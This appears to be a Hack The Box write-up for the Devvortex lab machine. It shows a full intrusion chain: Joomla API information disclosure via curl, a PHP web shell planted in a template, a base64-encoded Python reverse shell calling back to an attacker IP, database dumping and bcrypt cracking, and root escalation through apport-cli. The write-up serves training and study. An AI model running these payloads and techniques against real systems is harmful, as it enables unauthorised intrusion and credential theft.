---
layout: post
author: Julio
date: 09-05-2024
title: Devvortex Write-Up
---

# Devvortex Write-Up

<div class="center"><img src="https://labs.hackthebox.com/storage/avatars/2565d292772abc4a2d774117cf4d36ff.png" width="350"></div>

## Introduction

<p>Devvortex is an "Easy" HTB machine. The following is its description on the platform:</p>

> Devvortex is an easy-difficulty Linux machine that features a Joomla CMS that is vulnerable to information disclosure. Accessing the service's configuration file reveals plaintext credentials that lead to Administrative access to the Joomla instance. With administrative access, the Joomla template is modified to include malicious PHP code and gain a shell. After gaining a shell and enumerating the database contents, hashed credentials are obtained, which are cracked and lead to SSH access to the machine. Post-exploitation enumeration reveals that the user is allowed to run apport-cli as root, which is leveraged to obtain a root shell.

## First Steps

<p>We can start our enumeration process by running Nmap to identify open ports:</p>

```bash
sudo nmap -T4 -p- --open -Pn 10.10.11.242
Starting Nmap 7.95 ( https://nmap.org ) at 2024-05-09 22:40 CEST
Nmap scan report for 10.10.11.242
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 35.02 seconds
```

<p>There are only two open ports: 22 and 80. We can then run Nmap with some flags to get service banner, service version, etc.</p>

```bash
sudo nmap -sC -sV -p 22,80 -Pn --open 10.10.11.242
Starting Nmap 7.95 ( https://nmap.org ) at 2024-05-09 22:41 CEST
Nmap scan report for 10.10.11.242
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.83 seconds
```

<p>We see that there's a redirect to "devvortex.htb" on port 80, so we will add it to our "/etc/hosts" file.</p>

```bash
cat /etc/hosts

127.0.0.1	localhost
255.255.255.255	broadcasthost
::1             localhost
10.10.11.242	devvortex.htb
```

<p>After opening the website in a browser, there's not much that could be interesting. We see an email in the footer: "info@DevVortex.htb". We can take note of it in case it is useful later and we move on.</p>

<p>Next step would be using Ffuf to look for subdomains:</p>

```bash
ffuf -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -w ~/Tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -ic -fw 4

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/
 :: Wordlist         : FUZZ: /Users/julio/Tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 85ms]
```

<p>It seems like "dev" is a valid subdomain. We will also add it to "/etc/hosts".</p>

```bash
cat /etc/hosts

127.0.0.1	localhost
255.255.255.255	broadcasthost
::1             localhost
10.10.11.242	devvortex.htb dev.devvortex.htb
```

<p>After accessing the new subdomain, we don't get a lot of information nor a lot of features to interact with. We see the following email address in the footer and take note: "contact@devvortex.htb".</p>

<p>By trying to access "/index.php" we are redirected to the home page, which indicates that the server is running a PHP application. Also, it seems like the website is running on Joomla, which can be verified by accessing its "robots.txt" file:</p>

```bash
curl http://dev.devvortex.htb/robots.txt
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

<p>We can then find Joomla's version with the following command:</p>

```bash
curl http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
<?xml version="1.0" encoding="UTF-8"?>
<extension type="file" method="upgrade">
	<name>files_joomla</name>
	<author>Joomla! Project</author>
	<authorEmail>admin@joomla.org</authorEmail>
	<authorUrl>www.joomla.org</authorUrl>
	<copyright>(C) 2019 Open Source Matters, Inc.</copyright>
	<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
	<version>4.2.6</version>
[...snip]
```

<p>This version seems to be vulnerable to an unauthenticated information disclosure issue. There's an <a href="https://www.exploit-db.com/exploits/51334">exploit</a> available, but by reading its code we can see that it consists of calls to an API endpoint. We can exploit it with Curl or even rewrite the exploit in a different language if we feel like it. I'll use Curl.</p>

<p>First, we can get information about the users:</p>

```bash
curl "http://dev.devvortex.htb/api/index.php/v1/users?public=true" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   725    0   725    0     0   5818      0 --:--:-- --:--:-- --:--:--  5846
{
  "links": {
    "self": "http://dev.devvortex.htb/api/index.php/v1/users?public=true"
  },
  "data": [
    {
      "type": "users",
      "id": "649",
      "attributes": {
        "id": 649,
        "name": "lewis",
        "username": "lewis",
        "email": "lewis@devvortex.htb",
        "block": 0,
        "sendEmail": 1,
        "registerDate": "2023-09-25 16:44:24",
        "lastvisitDate": "2024-05-09 15:46:56",
        "lastResetTime": null,
        "resetCount": 0,
        "group_count": 1,
        "group_names": "Super Users"
      }
    },
    {
      "type": "users",
      "id": "650",
      "attributes": {
        "id": 650,
        "name": "logan paul",
        "username": "logan",
        "email": "logan@devvortex.htb",
        "block": 0,
        "sendEmail": 0,
        "registerDate": "2023-09-26 19:15:42",
        "lastvisitDate": null,
        "lastResetTime": null,
        "resetCount": 0,
        "group_count": 3,
        "group_names": "Registered\nAdministrator\nSuper Users"
      }
    }
  ],
  "meta": {
    "total-pages": 1
  }
}
```

<p>Then, we can get configuration information:</p>

```bash
curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2010    0  2010    0     0  12102      0 --:--:-- --:--:-- --:--:-- 12181
{
  "links": {
    "self": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true",
    "next": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20",
    "last": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"
  },
  "data": [
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_message": "This site is down for maintenance.<br>Please check back again soon.",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "display_offline_message": 1,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_image": "",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "sitename": "Development",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "editor": "tinymce",
        "id": 224
      }
    },
[...snip]
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "lewis",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
      }
    },
[...snip]
  ],
  "meta": {
    "total-pages": 4
  }
}
```

<p>User "lewis" seems to have the password "P4ntherg0t1n5r3c0n##". We can use it to successfully login to Joomla on "/administrator". We tried to SSH into the machine as well with these credentials but it did not work.</p>

<p>After logging into Joomla, Lewis seems to be part of the super users - which means that we have administrator privileges. We can go to "System > Templates > Site Templates > Cassiopedia Details and Files > error.php". We can then add <custom-code>system($_GET['cmd']);</custom-code> to second line of the code.</p>

<p>To finally achieve remote code execution (RCE), we can run:</p>

```bash
curl -s "http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=whoami"
www-data
curl -s "http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
curl -s "http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=pwd"
/var/www/dev.devvortex.htb/templates/cassiopeia
```

<p>We can check if Python3 is available on the machine:</p>

```bash
curl -s "http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=which+python3"
/usr/bin/python3
```

<p>We can then generate a reverse shell payload with GoPariah:</p>

```bash
gopariah python3_b64 10.10.16.8 9001
echo -n cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjgiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc= | base64 -d | bash
```

<p>We URL-encode it and send it in the "cmd" parameter. Before doing it, we should setup a listener so we can catch the reverse shell connection:</p>

```bash
nc -l 9001
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$
```

<p>We're in!</p>

## User Flag

<p>Lewis's credentials can be used to access MySQL:</p>

```bash
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p'P4ntherg0t1n5r3c0n##'
mysql -u lewis -p'P4ntherg0t1n5r3c0n##'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 83152
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

<p>We can get Logan's password hash with the following commands:</p>

```bash
mysql> use joomla
use joomla
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

[...snip]

mysql> show tables;
show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
[...snip]
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+

mysql> select * from sd4fg_users\G
select * from sd4fg_users\G
[...snip]
*************************** 2. row ***************************
           id: 650
         name: logan paul
     username: logan
        email: logan@devvortex.htb
     password: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
[...snip]
```

<p>We save it to a file called "hashcrackmepls" and use John The Ripper with the "rockyou.txt" wordlist to crack the hash.</p>

```bash
john --wordlist=Tools/rockyou.txt hashcrackmepls
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
0g 0:00:00:26 0.00% (ETA: 2024-05-16 02:35) 0g/s 33.90p/s 33.90c/s 33.90C/s mylife..animal
0g 0:00:00:35 0.01% (ETA: 2024-05-16 01:45) 0g/s 34.01p/s 34.01c/s 34.01C/s soledad..rascal
tequieromucho    (?)
[...snip]
```

<p>The password is "tequieromucho". We can then log into the machine via SSH and get the "user.txt" flag:</p>

```bash
cat user.txt
af3dfe6520b8dffe6bdc801d09c0d8fc
```

## Root Flag

<p>The first thing we will run after logging into the machine is running "sudo -l". We will get the following output:</p>

```bash
sudo -l
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

<p>So, Logan can run "/usr/bin/apport-cli" as root. It seems like there's a CVE related to privilege escalation with apport-cli. According to its <a href="https://github.com/diego-tella/CVE-2023-1326-PoC">PoC</a>, we can become rooting by doing the following:</p>

```bash
sudo apport-cli -P 10610 -f

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
.......................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (6.3 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
root@devvortex:/home/logan#
```

<p>After choosing "V", a different screen will show up. We can then enter "!/bin/bash" and press enter. We will become root.</p>

<p>We can then grab the root flag:</p>

```bash
cat /root/root.txt
6696e021cef172376451650f58ce1dfa
```

<p>That's all, folks!</p>
